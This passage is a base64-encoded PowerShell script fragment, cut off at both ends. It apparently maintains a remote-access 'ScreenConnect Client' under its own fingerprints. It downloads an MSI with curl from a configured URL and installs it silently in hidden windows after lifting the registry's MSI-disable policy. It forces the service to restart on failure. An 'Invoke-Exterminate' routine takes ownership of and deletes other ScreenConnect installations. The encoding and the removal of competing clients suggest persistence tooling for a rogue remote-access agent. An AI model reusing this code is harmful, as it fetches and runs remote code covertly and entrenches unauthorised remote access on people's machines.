SEVBTFRIWXwkZnB8cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaSIKICAgIH0KICAgIHJldHVybiAi
VU5IRUFMVEhZfCRmcHwkKCRyZWFzb25zIC1qb2luICcsJyl8cmVsYXk9JHRjcFJlbGF5fHVpPSR0
Y3BVaSIKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4YVJlaW5zdGFsbEFsbG93ZWQgewogICAgIyBNYXgg
b25lIHJlaW5zdGFsbCBwZXIgMTJoIHVubGVzcyAtRm9yY2UgKHN0b3BzIGR1cGxpY2F0ZSBzdG9y
bSkKICAgICRmbGFnID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9yZWluc3RhbGwuZmxhZycK
ICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRmbGFnKSkgeyByZXR1cm4gJHRy
dWUgfQogICAgdHJ5IHsKICAgICAgICAkYWdlID0gKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJGZsYWcpLkxhc3RXcml0ZVRpbWUKICAgICAgICByZXR1cm4gKCRhZ2UuVG90YWxI
b3VycyAtZ2UgMTY4KQogICAgfSBjYXRjaCB7IHJldHVybiAkdHJ1ZSB9Cn0KCmZ1bmN0aW9uIE1h
cmstR3J5eGFSZWluc3RhbGwgewogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBh
dGggJFdvcmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSkuVG9V
bml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlCn0KCmZ1
bmN0aW9uIFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50KFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAg
ICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQogICAgJG5hbWUgPSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkZ3VpZCA9IEZpbmQtUHJv
ZHVjdEd1aWQgJEZpbmdlcnByaW50CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJF
XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAy
PiYxIHwgT3V0LU51bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNc
TWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAv
ZCAwIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgaWYgKCRndWlkKSB7CiAgICAgICAgJHAgPSBTdGFy
dC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICRndWlkIC9xbiAvbm9yZXN0
YXJ0IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBI
aWRkZW4KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2CiAgICB9CiAgICAkc3ZjID0gR2V0
LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlm
ICgkc3ZjKSB7CiAgICAgICAgJiBzYy5leGUgc3RvcCAkbmFtZSAyPiYxIHwgT3V0LU51bGwKICAg
ICAgICAmIHNjLmV4ZSBkZWxldGUgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQt
U2xlZXAgLVNlY29uZHMgMgogICAgfQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgewogICAgICAgICRkID0gSm9pbi1Q
YXRoICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICAgICBp
ZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICAmIHRha2Vvd24uZXhl
IC9GICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJ3JlbW92ZWQnCn0KCmZ1bmN0aW9uIEluc3Rh
bGwtR3J5eGFGcm9tTXNpKFtzdHJpbmddJE1zaVBhdGgpIHsKICAgICYgcmVnLmV4ZSBkZWxldGUg
J0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBE
aXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAkbG9nID0gSm9pbi1QYXRo
ICRXb3JrRGlyICdtc2lfZ3J5eGFfZW5zdXJlLmxvZycKICAgICRwID0gU3RhcnQtUHJvY2VzcyBt
c2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvaSBgIiRNc2lQYXRoYCIgL3FuIC9ub3Jlc3RhcnQg
QUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBh
c3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICRleGl0ID0gJHAuRXhpdENvZGUKICAgIGlm
ICgkZXhpdCAtZXEgMTYxOCkgewogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDMwCiAgICAg
ICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi9pIGAiJE1z
aVBhdGhgIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAv
TCp2IGAiJGxvZ2AiIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAg
ICRleGl0ID0gJHAuRXhpdENvZGUKICAgIH0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEwCiAg
ICByZXR1cm4gJGV4aXQKfQoKZnVuY3Rpb24gSW52b2tlLUdyeXhhRW5zdXJlIHsKICAgICMgTzQw
IEhBUkQgUlVMRTogaWYgQU5ZIG5vbi1zZXZyeiBTY3JlZW5Db25uZWN0IGlzIFJ1bm5pbmcgLT4g
TkVWRVIgL3ggb3IgL2kuCiAgICAjIEZQIGRyaWZ0IHdoaWxlIFJ1bm5pbmcgaXMgbG9nZ2VkIG9u
bHkgKG5vIHJlaW5zdGFsbCkuCiAgICAjIFJlaW5zdGFsbCBPTkxZIHdoZW4gbm90aGluZyBHcnl4
YS1saWtlIGlzIFJ1bm5pbmcgKG9yIC1Gb3JjZSkuCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1M
aXRlcmFsUGF0aCAkV29ya0RpcikpIHsKICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0
b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8IE91dC1OdWxsCiAgICB9CiAgICAkbG9nID0gSm9p
bi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1cmUubG9nJwogICAgZnVuY3Rpb24gR0xvZyhbc3Ry
aW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQg
J3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBh
dGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0K
CiAgICAkb2xkRnAgPSBHZXQtR3J5eGFGcAogICAgJGRvRGVlcCA9IFtib29sXSgkRGVlcCAtb3Ig
JEZvcmNlIC1vciAoJEV4dHJhIC1tYXRjaCAnKD9pKWRlZXB8Zm9yY2UnKSkKICAgIEdMb2cgImdy
eXhhX2Vuc3VyZV9iZWdpbiBkZWVwPSRkb0RlZXAgZm9yY2U9JEZvcmNlIG9sZF9mcD0kb2xkRnAi
CgogICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0Zw
KSB7CiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgIEdMb2cgImFscmVhZHlf
cnVubmluZ19mcD0kcnVubmluZ0ZwIGxvY2tfbm9fcmVpbnN0YWxsIgogICAgICAgIGlmICgtbm90
ICRGb3JjZSkgewogICAgICAgICAgICBpZiAoJGRvRGVlcCkgewogICAgICAgICAgICAgICAgJG1z
aSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnX2dyeXhhLm1zaScKICAgICAgICAgICAgICAgICR0
bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2NfZ3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpO
ZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAg
ICAgICAgICAgJGN1cmwgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJs
LmV4ZScKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAk
Y3VybCA9ICdjdXJsLmV4ZScgfQogICAgICAgICAgICAgICAgICAgICYgJGN1cmwgLUwgLS1zc2wt
bm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHNj
cmlwdDpHcnl4YU1zaVVybCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICAgICBpZiAo
KFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0ZW0gJHRtcCkuTGVuZ3RoIC1ndCAxMDAwMDAw
KSkgewogICAgICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAg
LURlc3RpbmF0aW9uICRtc2kgLUZvcmNlCiAgICAgICAgICAgICAgICAgICAgICAgICRwcm9kTmFt
ZSA9IEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9kdWN0TmFtZScKICAgICAgICAgICAgICAgICAg
ICAgICAgJG5ld0ZwID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgICAgICAg
ICAgICAgICAgICAgICBpZiAoJG5ld0ZwIC1hbmQgKCRuZXdGcCAtbmUgJHJ1bm5pbmdGcCkpIHsK
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdMb2cgImZwX2RyaWZ0X0lHTk9SRURfd2hpbGVf
cnVubmluZyBydW5uaW5nPSRydW5uaW5nRnAgbXNpPSRuZXdGcCIKICAgICAgICAgICAgICAgICAg
ICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdMb2cgImRlZXBfZnBf
bWF0Y2g9JHJ1bm5pbmdGcCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAg
ICAgICAgIH0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggeyBHTG9nICJkZWVwX21zaV9zb2Z0ZmFp
bD0kXyIgfQogICAgICAgICAgICAgICAgZmluYWxseSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0
aCAkdG1wIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgICAg
IH0KICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nRnB8cnVubmluZz0xfG5vLXJl
aW5zdGFsbCIKICAgICAgICB9CiAgICAgICAgR0xvZyAnZm9yY2VfcmVpbnN0YWxsX2Rlc3BpdGVf
cnVubmluZycKICAgIH0KCiAgICBpZiAoLW5vdCAkRm9yY2UgLWFuZCAoVGVzdC1BbnlOb25TZXZy
elNjUnVubmluZykpIHsKICAgICAgICAkcnVubmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcAog
ICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRnAKICAgICAgICByZXR1cm4gIkhFQUxUSFl8JHJ1
bm5pbmdGcHxydW5uaW5nPTF8Z3VhcmQiCiAgICB9CgogICAgaWYgKC1ub3QgJGRvRGVlcCAtYW5k
IC1ub3QgJEZvcmNlKSB7CiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5nICRvbGRGcCkgeyByZXR1
cm4gIkhFQUxUSFl8JG9sZEZwfHJ1bm5pbmc9MSIgfQogICAgICAgICRuYW1lID0gIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICgkb2xkRnApIgogICAgICAgICYgc2MuZXhlIGNvbmZpZyAkbmFtZSBzdGFy
dD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYx
IHwgT3V0LU51bGwKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAgICAgaWYgKFRl
c3QtU2NSdW5uaW5nICRvbGRGcCkgeyBHTG9nICdsaWdodF9zdGFydGVkX29rJzsgcmV0dXJuICJI
RUFMVEhZfCRvbGRGcHxzdGFydGVkPTEiIH0KICAgICAgICBpZiAoRmluZC1Qcm9kdWN0R3VpZCAk
b2xkRnApIHsKICAgICAgICAgICAgJG51bGwgPSBSZXBhaXItU0NTZXJ2aWNlICRvbGRGcAogICAg
ICAgICAgICBHTG9nICdsaWdodF9yZXBhaXJfZG9uZScKICAgICAgICAgICAgaWYgKFRlc3QtU2NS
dW5uaW5nICRvbGRGcCkgeyByZXR1cm4gIkhFQUxUSFl8JG9sZEZwfHJlcGFpcmVkPTEiIH0KICAg
ICAgICB9CiAgICAgICAgR0xvZyAnbGlnaHRfZXNjYWxhdGVfaW5zdGFsbF9taXNzaW5nJwogICAg
ICAgICRkb0RlZXAgPSAkdHJ1ZQogICAgfQoKICAgIGlmICgtbm90ICRGb3JjZSAtYW5kIC1ub3Qg
KFRlc3QtR3J5eGFSZWluc3RhbGxBbGxvd2VkKSkgewogICAgICAgIEdMb2cgJ3JlaW5zdGFsbF9y
YXRlX2xpbWl0ZWQnCiAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfHJhdGUtbGltaXRl
ZCIKICAgIH0KCiAgICAkbXNpID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2dfZ3J5eGEubXNpJwog
ICAgJHRtcCA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJzY19ncnl4YV97MH0ubXNpIiAtZiBbZ3Vp
ZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQogICAgJGZldGNoZWQgPSAkZmFsc2UKICAgIHRy
eSB7CiAgICAgICAgJGN1cmwgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxj
dXJsLmV4ZScKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdj
dXJsLmV4ZScgfQogICAgICAgICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10
aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHNjcmlwdDpHcnl4YU1zaVVybCAyPiYx
IHwgT3V0LU51bGwKICAgICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0ZW0g
JHRtcCkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgewogICAgICAgICAgICBDb3B5LUl0ZW0gLUxpdGVy
YWxQYXRoICR0bXAgLURlc3RpbmF0aW9uICRtc2kgLUZvcmNlCiAgICAgICAgICAgICRmZXRjaGVk
ID0gJHRydWUKICAgICAgICAgICAgR0xvZyAoIm1zaV9mZXRjaGVkIGJ5dGVzPXswfSIgLWYgKEdl
dC1JdGVtICRtc2kpLkxlbmd0aCkKICAgICAgICB9CiAgICB9IGNhdGNoIHsgR0xvZyAibXNpX2Zl
dGNoX2Vycj0kXyIgfQogICAgZmluYWxseSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1w
IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9CgogICAgaWYgKC1ub3QgJGZl
dGNoZWQgLWFuZCAoVGVzdC1QYXRoICRtc2kpIC1hbmQgKChHZXQtSXRlbSAkbXNpKS5MZW5ndGgg
LWd0IDEwMDAwMDApKSB7CiAgICAgICAgJGZldGNoZWQgPSAkdHJ1ZQogICAgICAgIEdMb2cgJ21z
aV91c2luZ19jYWNoZScKICAgIH0KICAgIGlmICgtbm90ICRmZXRjaGVkKSB7CiAgICAgICAgR0xv
ZyAnbXNpX2ZldGNoX0ZBSUwnCiAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfG1zaS1m
ZXRjaC1mYWlsIgogICAgfQoKICAgICRwcm9kTmFtZSA9IEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQ
cm9kdWN0TmFtZScKICAgICRuZXdGcCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAkcHJvZE5hbWUK
ICAgIGlmICgtbm90ICRuZXdGcCkgewogICAgICAgIEdMb2cgIm1zaV9mcF9wYXJzZV9GQUlMIG5h
bWU9JHByb2ROYW1lIgogICAgICAgIHJldHVybiAiVU5IRUFMVEhZfCRvbGRGcHxtc2ktZnAtcGFy
c2UtZmFpbCIKICAgIH0KICAgIEdMb2cgIm1zaV9mcD0kbmV3RnAgcHJvZHVjdD0kcHJvZE5hbWUi
CgogICAgaWYgKC1ub3QgJEZvcmNlIC1hbmQgKFRlc3QtQW55Tm9uU2V2cnpTY1J1bm5pbmcpKSB7
CiAgICAgICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgICAgICBTZXQtR3J5
eGFGcCAkcnVubmluZ0ZwCiAgICAgICAgR0xvZyAnYWJvcnRfaW5zdGFsbF9iZWNhbWVfcnVubmlu
ZycKICAgICAgICByZXR1cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5nPTF8YWJvcnQtaW5z
dGFsbCIKICAgIH0KCiAgICBNYXJrLUdyeXhhUmVpbnN0YWxsCiAgICBpZiAoRmluZC1Qcm9kdWN0
R3VpZCAkbmV3RnApIHsKICAgICAgICBHTG9nICJyZXBhaXJfYmVmb3JlX2luc3RhbGw9JG5ld0Zw
IgogICAgICAgICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAkbmV3RnAKICAgICAgICBpZiAoVGVz
dC1TY1J1bm5pbmcgJG5ld0ZwKSB7CiAgICAgICAgICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAg
ICAgICAgICByZXR1cm4gIkhFQUxUSFl8JG5ld0ZwfHJlcGFpcmVkPTEiCiAgICAgICAgfQogICAg
ICAgIEdMb2cgInVuaW5zdGFsbF9zdHVjaz0kbmV3RnAiCiAgICAgICAgJG51bGwgPSBVbmluc3Rh
bGwtU2NGaW5nZXJwcmludCAkbmV3RnAKICAgIH0KICAgIGlmICgkb2xkRnAgLWFuZCAkb2xkRnAg
LW5lICRuZXdGcCAtYW5kIChGaW5kLVByb2R1Y3RHdWlkICRvbGRGcCkpIHsKICAgICAgICBHTG9n
ICJ1bmluc3RhbGxfb2xkX2NmZz0kb2xkRnAiCiAgICAgICAgJG51bGwgPSBVbmluc3RhbGwtU2NG
aW5nZXJwcmludCAkb2xkRnAKICAgIH0KCiAgICBTZXQtR3J5eGFGcCAkbmV3RnAKICAgICRleGl0
ID0gSW5zdGFsbC1Hcnl4YUZyb21Nc2kgJG1zaQogICAgR0xvZyAibXNpZXhlY19leGl0PSRleGl0
IgoKICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkbmV3RnApIgogICAgJiBzYy5l
eGUgY29uZmlnICRuYW1lIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbAogICAgJiBzYy5leGUg
ZmFpbHVyZSAkbmFtZSByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC8zMDAwL3Jlc3RhcnQv
MzAwMC9yZXN0YXJ0LzMwMDAgMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBzdGFydCAkbmFt
ZSAyPiYxIHwgT3V0LU51bGwKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgICYgc2MuZXhl
IHN0YXJ0ICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQoK
ICAgIGZvcmVhY2ggKCRrZnAgaW4gJHNjcmlwdDpTZXZyektlZXApIHsKICAgICAgICAka24gPSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCRrZnApIgogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRrbiAy
PiYxIHwgT3V0LU51bGwKICAgICAgICBpZiAoLW5vdCAoR2V0LVNlcnZpY2UgLU5hbWUgJGtuIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgeyAkbnVsbCA9IFJlcGFpci1TQ1NlcnZpY2Ug
JGtmcCB9CiAgICB9CgogICAgaWYgKC1ub3QgKFRlc3QtU2NSdW5uaW5nICRuZXdGcCkpIHsgJG51
bGwgPSBSZXBhaXItU0NTZXJ2aWNlICRuZXdGcCB9CgogICAgaWYgKFRlc3QtU2NSdW5uaW5nICRu
ZXdGcCkgewogICAgICAgIEdMb2cgJ3Bvc3RfcnVubmluZ19vaycKICAgICAgICByZXR1cm4gIkhF
QUxUSFl8JG5ld0ZwfGluc3RhbGxlZD0xIgogICAgfQogICAgR0xvZyAncG9zdF9zdGlsbF9kb3du
JwogICAgcmV0dXJuICJVTkhFQUxUSFl8JG5ld0ZwfHN0aWxsLW5vdC1ydW5uaW5nIgp9CgpmdW5j
dGlvbiBJbnZva2UtRXh0ZXJtaW5hdGUgewogICAgIyBMNzogdHJ1ZSByZW1vdmFsLiBDb3JyZWN0
IFdPVzY0MzJOb2RlIGhpdmUgKyBtc2lleGVjICsgVW5pbnN0YWxsU3RyaW5nCiAgICAjIGZhbGxi
YWNrICsgZm9yY2UgZGlyIG51a2UuIEtlZXAgc2V2cnorYWx0K2N1cnJlbnQgZ3J5eGEgRlAgKGdy
eXhhLmNmZykuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cn
CiAgICAka2VlcCA9IEAoR2V0LUtlZXBGaW5nZXJwcmludHMpCiAgICAkbiA9IEB7IHN2YyA9IDA7
IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAg
ZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAo
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1D
b250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZQogICAgICAgIFdyaXRlLU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24g
SXMtS2VlcGVyKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZh
bHNlIH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoi
KSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5j
dGlvbiBGb3JjZS1SZW1vdmVEaXIoW3N0cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1v
ciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAg
ICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFu
ZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFydHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9y
ZGluYWxJZ25vcmVDYXNlKSB9IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVBy
b2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfQogICAgICAgICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwK
ICAgICAgICAmIGljYWNscy5leGUgJGQgL2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9R
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0
cmF0b3JzOkYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBj
bWQuZXhlIC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1O
dWxsCiAgICAgICAgICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91
dC1OdWxsCiAgICAgICAgfQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7
CiAgICAgICAgICAgICRlbXB0eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiAr
IFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1J
dGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAg
ICAgICYgcm9ib2NvcHkuZXhlICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51
bGwKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVy
YWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgICAgIH0KICAgICAgICByZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkK
ICAgIH0KICAgIGZ1bmN0aW9uIFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAk
Z3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUKICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkg
JGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAk
cHJvcC5EaXNwbGF5TmFtZQogICAgICAgIGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAg
ICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1
aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUg
LVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRu
XSBndWlkPSRndWlkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0
Q29kZSAtaW4gMCwgMTYwNSwgMTYxNCwgMzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0K
ICAgICAgICAkdXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAg
ICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4
